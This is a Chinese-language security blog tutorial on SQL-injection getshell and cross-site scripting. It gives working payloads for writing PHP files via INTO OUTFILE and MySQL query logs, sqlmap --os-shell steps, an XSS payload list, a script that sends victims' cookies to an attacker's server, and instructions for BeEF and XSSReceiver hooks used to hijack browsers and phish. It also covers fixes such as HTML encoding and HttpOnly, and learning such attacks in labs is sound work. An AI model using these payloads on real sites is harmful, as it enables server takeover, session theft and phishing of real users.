---
title: "SQL 注入 Getshell 与 XSS 跨站脚本攻击"
permalink: sql-getshell-and-xss/
date: 2025-12-08 00:56:35
categories:
  - 网络安全
  - Web 安全
tags:
  - SQL注入
  - XSS
  - Getshell
img: /medias/featureimages/21.jpg
summary: "into outfile 写马、日志写马等 SQL 注入 getshell 条件与手法，以及 XSS 的类型、payload 与利用。"
---

<!-- more -->

## 1 into outfile 导出文件
## 利用方式
`-1' union select "<?php phpinfo();?>",2 into outfile "/var/www/html/han.php"#`

 解释：把 字符串保存到` /var/www/html/han.php` 文件中

## 前提条件
1 网站**必须** 使用了 **mysql root 用户**

2 要找到网站保存的绝对路径，且路径有**写权限**

3 mysql 配置项 secure-file-priv 必须是**空字符串**

`**secure-file-priv=""**`

**secure-file-priv 配置项详细解释：**

+ **不允许mysql导出文件**

`secure-file-priv=NULL   或   secure-file-priv=  `

+  允许mysql导出文件到指定目录

 `secure-file-priv=/var/lib/mysql  `

+  允许mysql导出文件**到任意目录**

`secure-file-priv=""`

## sqlmap --os-shell
### 利用流程
`python   sqlmap.py -r   绝对路径  -p username  --os-shell `

###  选择脚本类型：

###  选择目录：

### ✨ --os-shell 原理 (-v 3 即可看到原理)
#### 第一步：into dumpfile 导出随机文件 /var/www/html/tmpuvcou.php，是一个文件上传器
⚠️  into outfile 是把字符串导出到文件中， into dumpfile 是把字节码（hex码）导出到文件中

#### 第二步：写入php木马 /var/www/html/tmpbnvhg.php

#### 第三步：执行命令 （可能无回显）
#### 第四步：exit退出，自动清除文件 （可能清不掉）

## 2  mysql 查询日志导出文件
## 利用方式

### 1  登录到 mysql 后台   (phpmyadmin)

### 2  查看 secure-file-priv 是否为空字符串

`**空字符串，说明可以 导出文件到任意位置**`

### 3  查看mysql查询日志是否开启
`SHOW VARIABLES LIKE "%general_log%"`

#### 如果mysql查询日志是关闭的，需要手动打开
`SET GLOBAL GENERAL_log = "on"`

### 4  修改日志的保存路径为php网站所在路径
`SET GLOBAL GENERAL_log_file = "/var/www/html/han.php"`

### 5  进行查询，查询的日志会被保存到 /var/www/html/han.php 文件中
`SELECT "<?php phpinfo();?>"`

### 6 访问日志文件

## XSS 跨站脚本攻击
## 产生原因
后端开发没有对用户传入的参数 做严格的限制与过滤，并直接输出了用户传入的参数，导致用户传入的参数被浏览器 当做**java script 执行**

**XSS ：cross  site  script=>css=>xss**

## 危害
```plain
窃取浏览器端的敏感信息(一般是指浏览器中保存的cookie)
获取浏览器的其他信息
劫持浏览器
getshell,在服务器中执行命令(只在 javascript 充当服务器编程语言时[如 node.js 、bun]，
才可能产生该危害)

Node.js 是一个基于 V8 引擎的 JavaScript 运行时环境，2009 年由 Ryan Dahl 创建,
让 JS 可以在浏览器外执行，通常用于开发后端服务、CLI 工具等
Bun 是 2021 年推出的 JavaScript 运行时，旨在替代 Node.js。它使用 JavaScriptCore
引擎（来自 Safari），内置打包、转译、包管理等功能，追求更快的启动速度和执行效率。
```

## 挖掘
### 白盒测试
实际工作中，xss 都是黑盒扫描器扫出的，很少遇到代码审计

####  方法: 看用户输入的内容有没有直接输出
```php
$keyword = $_GET['keyword'];
echo "搜索结果：<strong>$keyword</strong>";
```

### 黑盒测试
#### 方法1
##### 1   输入一个任意字符串，看网站是否原样输出

##### 2  替换字符串为 xss payload， 看是否触发弹窗，触发弹窗则证明有xss漏洞
`<script>alert(1)</script>`

#### 方法2 随机复制10-20行 xss payload
[https://github.com/TheKingOfDuck/fuzzDicts/blob/master/easyXssPayload/easyXssPayload.txt](https://github.com/TheKingOfDuck/fuzzDicts/blob/master/easyXssPayload/easyXssPayload.txt)

随机复制10-20行 xss payload，直接粘贴到目标网站的输入框中，看是否触发弹窗，以及触发的 弹窗对应的是哪个具体payload

例：随意复制，粘贴到靶场，触发弹窗

```http
<script>javascript:alert(354)</script\x0D
<script>javascript:alert(355)</script\x0A
<script>javascript:alert(356)</script\x0B
<script charset="\x22>javascript:alert(357)</script>
<!--\x3E<img src=xxx:x onerror=javascript:alert(358)> -->
--><!-- ---> <img src=xxx:x onerror=javascript:alert(359)> -->
--><!-- --\x00> <img src=xxx:x onerror=javascript:alert(360)> -->
--><!-- --\x2361> <img src=xxx:x onerror=javascript:alert(361)> -->
--><!-- --\x3E> <img src=xxx:x onerror=javascript:alert(36
'-alert(1)-'
"onmouseover="alert(1)
```

说明 359 处的payload可以使用

```groovy
--><!-- ---> <img src=xxx:x onerror=javascript:alert(359)> -->
```

## 利用
### 分类
#### 反射型XSS
xss 只对**当前网站的当前页面生效**，是**一次性**的，**会经过服务器**

#### 存储型XSS
xss 会经过服务器，且会**被服务器保存到数据库中**，当**用户访问时自动触发**，是**持久性**的

#### DOM型XSS
xss 只对**当前网站的当前页面生效**，是**一次性**的，**不会经过服务器**，是**纯前端的漏洞**。

### 常见的 playload
#### 1 script 标签
`<script>alert(1)</script>`

#### 2 a 标签
 `<a href="javascript:alert(1)">XSS Test</a>`

#### 3 事件类型
JavaScript 事件 : [https://www.runoob.com/jsref/dom-obj-event.html](https://www.runoob.com/jsref/dom-obj-event.html)

##### oneload
在页面、图片、视频加载成功时触发 js 代码

`<img src="[https://cdn.pixabay.com/photo/2025/11/28/16/07/frost-9983255_1280.jpg](https://cdn.pixabay.com/photo/2025/11/28/16/07/frost-9983255_1280.jpg)" onload="alert(1)"/>`

##### onerror
在页面、图片、视频加载失败时触发js 代码

`<img src="xxx" onerror="alert(1)" />`

##### onclick
当点击时触发 js 代码

`<button onclick="alert(1)"> 点我！！！！ </button>`

##### oncopy
当复制时触发

`<p oncopy="alert(1)"> 复制✨我💗</p>`

##### onmouseover
当鼠标移动到 元素上时触发

`<p onmouseover="alert(1)">你过来鸭！😄</p>`

## 窃取cookie
只有存储型的xss 才有意义

### 1 弹窗
cookie 在浏览器中， 可以使用 js dom读取，document.cookie，对应的xss payload 如下

攻击者：

 `<script>alert(document.cookie)<script>`

受害者：

只是弹窗攻击对于受害者没啥影响，受害者能看到自己的cookie

### 2 HTTP 外带获取 Cookie (img 标签)
#### 攻击者
#### 1  编写 exp.js
```jsx
var img = document.createElement('img'); // 在dom对象中创建一个img元素
img.width = 0;
img.height = 0;
img.src = "http://your_ip:your_port/1.png?" + escape(document.cookie);
// 定义img标签的src，也就是图片的源，由于img标签会请求源地址，所以可以进行http数据外带
document.body.appendChild(img);
```

⚠️： your_ip 和 your_port 必须选择受害者能够连接到的ip和端口，实际工作会选择任何人都能连接的云服务器

#### 2  开启监听
`python -m http.server `

####
#### 3  攻击者使用 payload 攻击目标网站  (打 xss 漏洞)

```plain
<script type="text/javascript" src="http://your_ip:your_port/exp.js"></script>
<script type="text/javascript" src="http://192.168.79.129:8000/exp.js"></script>

%3D 是 =
```

#### 4  攻击过程结束，耐心等待受害者上钩
#### 5  如果受害者上钩，攻击者即可在监听的HTTP日志中看到受害者的cookie

#### 受害者
#### 受害者登录自己的账号
### 3 拿到cookie后怎么办
####  替换、刷新

### 修复
#### 1  过滤常见关键字
比如过滤 js 标签 （一般很容易拦截网站的正常操作）

`<script>alert(1)</script>`

```php
$keyword = $_GET['keyword'];

preg_match('/<script>/i', $keyword, $matches);
if (count($matches) > 0) {
  echo "搜索结果：<strong>检测到攻击，拒绝访问</strong>";
  exit;
}

echo "搜索结果：<strong>$keyword</strong>";
```

#### 2   HTML实体编码
HTML字符实体：  [https://www.runoob.com/html/html-entities.html](https://www.runoob.com/html/html-entities.html)

```php
< 编码后 &lt;
> 编码后 &gt;
```

```php
$keyword = $_GET['keyword'];
$keyword = htmlspecialchars($keyword);
echo "搜索结果：<strong>$keyword</strong>";
```

```php
攻击者输入 <script>alert(1)</script> 会变成 &lt;script&gt;alert(1)&lt;/script&gt;
可以正常显示，但无法进行 xss 攻击
```

#### 3  浏览器 Cookie 属性
```php
HttpOnly 的作用：禁止js读取cookie
HttpOnly 不会修复 xss 漏洞，只是xss漏洞不能再窃取cookie，只能弹窗（降低xss漏洞的危害）
```

```php
ini_set("session.cookie_httponly",1);
```

## 利用XSS-平台
## beef
源码：[https://github.com/beefproject/beef](https://github.com/beefproject/beef)

### 安装过程
#### 1  修改 beef 源代码 config.yaml 中的用户名和密码

#### 2 构建镜像
`docker build -t beef .`

#### 3 启动容器
`docker run -d -p 3000:3000 --name beef 镜像ID`

#### 4 访问 beef
`http://192.168.79.129:3000/ui/authentication`

[http://192.168.79.129:3000/ui/panel](http://192.168.79.129:3000/ui/panel)

5 用户名和密码  可以在配置文件中看到

### 使用
hook.js:  [http://192.168.79.129:3000/hook.js](http://192.168.79.129:3000/hook.js)

把 hook.js 拼接为 xss 的 payload：

### 劫持浏览器
如果受害者触发 xss ，beef 就会上线目标的浏览器，泄露浏览器的信息

commands 里面有非常多的功能，可以钓鱼、劫持目标的浏览器

### flash 更新钓鱼
 攻击者视角

受害者视角

### google gmail 钓鱼
攻击者视角

受害者视角

## XSSReceiver
[https://github.com/firesunCN/BlueLotus_XSSReceiver](https://github.com/firesunCN/BlueLotus_XSSReceiver)

### 安装过程
1 下载并启动容器

```plain
docker build -t bule .
docker run -d -p 10001:80 --name xssreceiver blue
```

2  把 config.php 复制到容器内部 (恢复密码为 bluelotus)

 `docker cp config.php xssreceiver:/app`

3  打开 [http://192.168.79.129:10001/login.php](http://192.168.79.129:10001/login.php) ，使用bluelotus密码登录

### 使用

得到payload，使用 payload 攻击目标网站有xss漏洞的地方

`<script src="http://192.168.79.129:10001/myjs/han.js"></script>`

### 获取信息
当受害者上钩后，XSSReceiver 平台即可看到目标浏览器的信息
